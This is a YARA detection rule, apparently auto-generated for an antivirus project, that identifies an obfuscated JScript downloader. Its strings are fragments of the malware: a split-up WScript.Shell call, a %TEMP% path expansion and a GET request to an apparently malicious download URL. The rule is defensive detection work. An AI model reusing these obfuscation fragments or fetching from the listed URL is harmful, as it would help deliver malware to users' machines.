rule sig_20160427_b2e7d511a8e392aa0ac542e5c65e66c8 {
  meta:
    description = "datamaliciousorder - file 20160427_b2e7d511a8e392aa0ac542e5c65e66c8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "59a227ee15d13f532d0a79909747737d689f6a66d2b34467f89be7f60e934d87"

  strings:
    $s1  = "function QwtjmGjbdw() {return ZnpzjNokyu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZDmaFDg" ascii
    $s2  = "function QwtjmGjbdw() {return ZnpzjNokyu[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"ZDmaFDg" ascii
    $s3  = "var ZnpzjNokyu = function BwikfIcqbp() {return WwygrYbjab[PezflClmpj](\"WScript\"+\".Shell\");}(), QgxjqXzzgh = 11;" fullword ascii
    $s4  = "function OjdzjLxtgi(VlhtsOlmaa, TltinAhlbr){WihuuSstud = WihuuSstud * 1; return VlhtsOlmaa - TltinAhlbr;};" fullword ascii
    $s5  = "ZefadAawor[NsjgbRpvbu](\"G\" + \"ET\", \"http://directenergy.tv/l2isd\", false);" fullword ascii
    $s6  = "var WwygrYbjab = this[\"WScript\"];" fullword ascii
    $s7  = "if (ZefadAawor[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "function ExtugZtwuf(){return HnaqzSalkb + \"\";};" fullword ascii
    $s9  = "function IccqeRpgpp() {return ((WobbfZldze == true) && (WobbfZldze == AlexwCusgg)) ? 1 : WihuuSstud;};" fullword ascii
    $s10 = "function PmhltNxieo()" fullword ascii
    $s11 = "}while (CvyuzSbtqj);" fullword ascii
    $s12 = "var KdmypEujge = false;" fullword ascii
    $s13 = "var WobbfZldze = false;" fullword ascii
    $s14 = "function UknzuHsnop(WrrnlYnzbw) {var QxaptKedkc = (1, 2, 3, 4, 5, WrrnlYnzbw); return QxaptKedkc;};" fullword ascii
    $s15 = "var AlexwCusgg = false;" fullword ascii
    $s16 = "KdmypEujge = true;" fullword ascii
    $s17 = "WobbfZldze = true; " fullword ascii
    $s18 = "function OyiuwOeyyi(){return 23;};" fullword ascii
    $s19 = "AlexwCusgg = true; " fullword ascii
    $s20 = "function SsumgEczrq(){return PezflClmpj;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}